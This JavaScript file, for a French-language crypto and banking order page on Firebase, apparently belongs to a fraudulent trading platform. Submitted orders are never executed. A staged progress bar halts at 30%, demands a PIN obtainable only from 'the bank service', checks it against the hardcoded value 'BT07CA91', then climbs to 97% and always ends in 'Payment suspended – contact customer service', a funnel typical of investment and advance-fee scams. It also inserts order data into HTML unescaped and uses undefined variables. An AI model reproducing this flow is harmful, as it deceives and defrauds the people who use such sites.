// js/ordres-firebase.js
import { auth, db } from '../firebase-config.js';
import {
    collection,
    addDoc,
    query,
    where,
    onSnapshot,
    orderBy
} from "https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore.js";
import { onAuthStateChanged } from "https://www.gstatic.com/firebasejs/9.6.10/firebase-auth.js";

// ==============================================
// CONFIGURATION INITIALE
// ==============================================
const allOptions = [
    { value: 'btc', text: 'Bitcoin (BTC)' },
    { value: 'eth', text: 'Ethereum (ETH)' },
    { value: 'usdt', text: 'Tether (USDT)' },
    { value: 'eur', text: 'Euro (EUR)' },
    { value: 'usd', text: 'Dollar (USD)' },
    { value: 'gbp', text: 'Livre Sterling (GBP)' }
];

// ==============================================
// FONCTIONS D'INITIALISATION
// ==============================================
function initializeApp() {
    const orderTypeSelect = document.getElementById('orderType');
    const assetSelect = document.getElementById('assetSelect');
    const amountInput = document.getElementById('amountInput');
    const limitInput = document.getElementById('limitInput');
    const form = document.querySelector('form');
    const ordersContainer = document.querySelector('.orders-container');

    onAuthStateChanged(auth, user => {
        if (user) {
            const userId = user.uid;
            setupOrderForm(form, orderTypeSelect, assetSelect, amountInput, limitInput, userId);
            loadUserOrders(ordersContainer, userId);
            setupUIInteractions(orderTypeSelect, amountInput);
            updateFormFields(orderTypeSelect, assetSelect, amountInput, limitInput);
        } else {
            alert("Veuillez vous connecter pour gérer vos ordres.");
            window.location.href = "connexion.html";
        }
    });
}

// ==============================================
// FONCTIONS DE GESTION DU FORMULAIRE
// ==============================================
function setupOrderForm(form, orderTypeSelect, assetSelect, amountInput, limitInput, userId) {
    form.addEventListener('submit', async function (e) {
        e.preventDefault();
        await submitOrderForm(orderTypeSelect, assetSelect, amountInput, userId);
    });
}

async function submitOrderForm(orderTypeSelect, assetSelect, amountInput, userId) {
    const orderType = orderTypeSelect.value;
    const asset = assetSelect.value;
    const assetText = assetSelect.selectedOptions[0].textContent;
    const amount = parseFloat(amountInput.value);

    const ordreData = {
        type: orderType,
        asset: asset,
        assetLabel: assetText,
        montant: amount,
        userId: userId,
        statut: "en attente",
        createdAt: new Date()
    };

    try {
        await addDoc(collection(db, "ordres"), ordreData);
        form.reset();
        updateFormFields(orderTypeSelect, assetSelect, amountInput, limitInput);
    } catch (error) {
        console.error("Erreur enregistrement :", error);
    }
}

// ==============================================
// FONCTIONS D'AFFICHAGE DES ORDRES
// ==============================================
function loadUserOrders(ordersContainer, userId) {
    const q = query(
        collection(db, "ordres"),
        where("userId", "==", userId),
        orderBy("createdAt", "desc")
    );

    onSnapshot(q, snapshot => {
        displayOrders(ordersContainer, snapshot);
    });
}

function displayOrders(ordersContainer, snapshot) {
    ordersContainer.innerHTML = "";

    if (snapshot.empty) {
        ordersContainer.innerHTML = showNoOrdersMessage();
        return;
    }

    snapshot.forEach(doc => {
        const data = doc.data();
        const card = createOrderCard(data.type, data.assetLabel, data.montant);
        ordersContainer.appendChild(card);

        if (data.statut === "en attente") {
            setTimeout(() => startOrderFlow(card), 1000);
        }
    });
}

function showNoOrdersMessage() {
    return `
        <div class="no-orders">
            <i class="fas fa-exchange-alt"></i>
            <h4 class="mt-3" style="color: #fff;">Aucun ordre en cours</h4>
            <p style="color: #fff;">Vos ordres actifs apparaîtront ici</p>
        </div>`;
}

// ==============================================
// FONCTIONS DE FLUX D'ORDRE
// ==============================================
function startOrderFlow(card) {
    showProgressBar(card, 0, 30, () => {
        showPinModal(card);
    });
}

function showProgressBar(card, start, end, callback) {
    const progressHtml = createProgressBarHtml(start);
    card.insertAdjacentHTML('beforeend', progressHtml);
    animateProgress(card, start, end, 1500, callback);
}

function createProgressBarHtml(progress) {
    return `
        <div class="mt-3 w-100">
            <div class="progress" style="height: 18px;">
                <div class="progress-bar progress-bar-striped progress-bar-animated" 
                     style="width: ${progress}%">${progress}%</div>
            </div>
        </div>`;
}

function animateProgress(card, start, end, duration, callback) {
    const progressBar = card.querySelector('.progress-bar');
    let progress = start;
    const stepTime = 20;
    const steps = duration / stepTime;
    const increment = (end - start) / steps;

    const timer = setInterval(() => {
        progress += increment;
        if (progress >= end) {
            progress = end;
            clearInterval(timer);
            if (callback) callback();
        }
        progressBar.style.width = `${progress}%`;
        progressBar.textContent = `${Math.round(progress)}%`;
    }, stepTime);
}

// ==============================================
// FONCTIONS DE GESTION DU PIN
// ==============================================
function showPinModal(card) {
    if (document.getElementById('pinModal')) return;

    const modal = createPinModal();
    document.body.appendChild(modal);

    setupPinValidation(card, modal);
}

function createPinModal() {
    const modalDiv = document.createElement('div');
    modalDiv.innerHTML = `
    <div class="modal fade show" id="pinModal" tabindex="-1" style="display:block; background:rgba(0,0,0,0.5);" aria-modal="true" role="dialog">
      <div class="modal-dialog modal-dialog-centered">
        <div class="modal-content">
          <div class="modal-header">
            <h5 class="modal-title">Validation requise</h5>
          </div>
          <div class="modal-body">
            <p class="text-muted small mt-2">Veuillez contacter le service bancaire pour recevoir votre code PIN ou résoudre le problème.</p>
            <p>Veuillez intégrer votre code PIN pour valider la transaction :</p>
            <input type="password" class="form-control mb-2" id="pinInput" maxlength="8" placeholder="Code PIN">
            <div id="pinError" class="text-danger" style="display:none;">Code PIN incorrect.</div>
          </div>
          <div class="modal-footer">
            <button type="button" class="btn btn-secondary" id="cancelPinBtn">Annuler</button>
            <button type="button" class="btn btn-primary" id="validatePinBtn">Valider</button>
          </div>
        </div>
      </div>
    </div>`;
    return modalDiv;
}

function setupPinValidation(card, modalDiv) {
    document.getElementById('validatePinBtn').onclick = function () {
        validatePin(card, modalDiv);
    };

    document.getElementById('cancelPinBtn').onclick = function () {
        cancelPin(modalDiv, card);
    };
}

function validatePin(card, modalDiv) {
    const pin = document.getElementById('pinInput').value.trim();
    if (pin !== "BT07CA91") {
        document.getElementById('pinError').style.display = 'block';
    } else {
        document.getElementById('pinError').style.display = 'none';
        document.getElementById('pinModal').remove();
        modalDiv.remove();
        continueTo97(card);
    }
}

function cancelPin(modalDiv, card) {
    document.getElementById('pinModal').remove();
    modalDiv.remove();
    showCancellation(card);
}

function continueTo97(card) {
    const progressBar = card.querySelector('.progress-bar');
    progressBar.classList.remove('progress-bar-animated', 'progress-bar-striped');
    progressBar.classList.add('bg-warning');

    animateProgress(card, 30, 97, 2000, () => {
        showSuspension(card);
    });
}

// ==============================================
// FONCTIONS D'AFFICHAGE DES MESSAGES
// ==============================================
function showSuspension(card) {
    const progressBar = card.querySelector('.progress-bar');
    progressBar.classList.remove('bg-warning');
    progressBar.classList.add('bg-danger');

    addMessageToCard(card, `
        <i class="fas fa-exclamation-triangle me-2"></i>
        Paiement suspendu - Veuillez contacter le service client
    `, 'danger');

    updateStatusText(card, '<i class="fas fa-pause-circle me-1"></i>En attente de validation', 'danger');
}

function showCancellation(card) {
    const progressBar = card.querySelector('.progress-bar');
    progressBar.style.width = '30%';
    progressBar.textContent = '30%';
    progressBar.classList.remove('progress-bar-animated', 'progress-bar-striped');
    progressBar.classList.add('bg-secondary');

    addMessageToCard(card, `
        <i class="fas fa-times-circle me-2"></i>
        Transaction annulée - Code PIN non validé
    `, 'danger');

    updateStatusText(card, '<i class="fas fa-ban me-1"></i>Transaction annulée', 'danger');
}

function addMessageToCard(card, message, type) {
    const messageDiv = document.createElement('div');
    messageDiv.className = `alert alert-${type} mt-2 mb-0`;
    messageDiv.innerHTML = message;
    card.appendChild(messageDiv);
}

function updateStatusText(card, html, className) {
    const statusText = card.querySelector('.text-warning');
    if (statusText) {
        statusText.innerHTML = html;
        statusText.className = `text-${className} mt-2`;
    }
}

// ==============================================
// FONCTIONS DE MISE À JOUR DE L'INTERFACE
// ==============================================
function updateFormFields(orderTypeSelect, assetSelect, amountInput, limitInput) {
    const orderType = orderTypeSelect.value;
    const config = getFormConfig(orderType);

    assetSelect.innerHTML = '';
    allOptions.filter(opt => config.assets.includes(opt.value)).forEach(addOption);

    document.getElementById('assetLabel').textContent = config.labels[0];
    document.getElementById('amountLabel').textContent = config.labels[1];
    document.getElementById('limitLabel').textContent = config.labels[2];
    limitInput.readOnly = config.readOnly;
    document.getElementById('rateInfo').style.display = config.showRate ? 'block' : 'none';

    amountInput[orderType === 'limit' ? 'addEventListener' : 'removeEventListener']('input', calculateRepayment);
}

function getFormConfig(orderType) {
    const configs = {
        'limit': {
            assets: ['eur', 'usd', 'gbp'],
            labels: ['Solde principal', 'Montant du prêt', 'Total à rembourser'],
            readOnly: true,
            showRate: true
        },
        'transfer': {
            assets: ['btc', 'eth', 'usdt', 'eur', 'usd', 'gbp'],
            labels: ['Solde principal', 'Montant', 'Prix restant'],
            readOnly: false,
            showRate: false
        },
        'buy': {
            assets: ['btc', 'eth', 'usdt'],
            labels: ['Choix de cryptomonnaie', 'Montant', 'Valeur exacte'],
            readOnly: false,
            showRate: false
        },
        'sell': {
            assets: ['btc', 'eth', 'usdt'],
            labels: ['Choix de cryptomonnaie', 'Montant', 'Valeur exacte'],
            readOnly: false,
            showRate: false
        }
    };
    return configs[orderType];
}

function addOption(currency) {
    const option = document.createElement('option');
    option.value = currency.value;
    option.textContent = currency.text;
    document.getElementById('assetSelect').appendChild(option);
}

function calculateRepayment() {
    const amount = parseFloat(document.getElementById('amountInput').value) || 0;
    document.getElementById('limitInput').value = (amount * 1.03).toFixed(2);
}

// ==============================================
// FONCTIONS DE CRÉATION D'ÉLÉMENTS
// ==============================================
function createOrderCard(type, asset, amount) {
    const typeData = getOrderTypeData(type);
    const card = document.createElement('div');
    card.className = `order-card ${typeData.class} mb-3 p-3 d-flex align-items-center`;
    card.innerHTML = createOrderCardHtml(typeData, asset, amount);
    return card;
}

function getOrderTypeData(type) {
    return {
        'buy': { label: 'Achat', class: 'buy' },
        'sell': { label: 'Vente', class: 'sell' },
        'transfer': { label: 'Transfert', class: 'transfer' },
        'limit': { label: 'Prêt', class: 'limit' }
    }[type];
}

function createOrderCardHtml(typeData, asset, amount) {
    return `
        <div class="flex-grow-1">
            <div class="fw-bold mb-1">${typeData.label} - ${asset}</div>
            <div>Montant : <span class="fw-semibold">${amount}</span></div>
            <div class="text-warning mt-2"><i class="fas fa-spinner fa-spin me-1"></i>Transfert en cours</div>
        </div>`;
}

// ==============================================
// FONCTIONS D'INTERACTION UTILISATEUR
// ==============================================
function setupUIInteractions(orderTypeSelect, amountInput) {
    setupOrderTypeChange(orderTypeSelect);
    setupFilterButtons();
    setupCardHoverEffects();
}

function setupOrderTypeChange(orderTypeSelect) {
    orderTypeSelect.addEventListener('change', () => {
        updateFormFields(orderTypeSelect, document.getElementById('assetSelect'),
            document.getElementById('amountInput'), document.getElementById('limitInput'));
    });
}

function setupFilterButtons() {
    document.querySelectorAll('.dropdown-item').forEach(item => {
        item.addEventListener('click', function (e) {
            e.preventDefault();
            filterOrders(this.textContent.toLowerCase());
        });
    });
}

function filterOrders(type) {
    const cards = document.querySelectorAll('.order-card');
    cards.forEach(card => {
        if (type === 'tous') {
            card.style.display = '';
        } else {
            const cardType = getCardType(card);
            card.style.display = cardType.includes(type.toLowerCase()) ? '' : 'none';
        }
    });
}

function getCardType(card) {
    if (card.classList.contains('buy')) return 'achats';
    if (card.classList.contains('sell')) return 'ventes';
    if (card.classList.contains('transfer')) return 'transferts';
    return '';
}

function setupCardHoverEffects() {
    document.querySelectorAll('.card-style, .order-card').forEach(card => {
        card.addEventListener('mouseenter', () => {
            card.style.transform = 'translateY(-5px)';
            card.style.boxShadow = '0 10px 25px rgba(0, 0, 0, 0.1)';
        });
        card.addEventListener('mouseleave', () => {
            card.style.transform = '';
            card.style.boxShadow = '';
        });
    });
}

// ==============================================
// INITIALISATION DE L'APPLICATION
// ==============================================
document.addEventListener('DOMContentLoaded', initializeApp);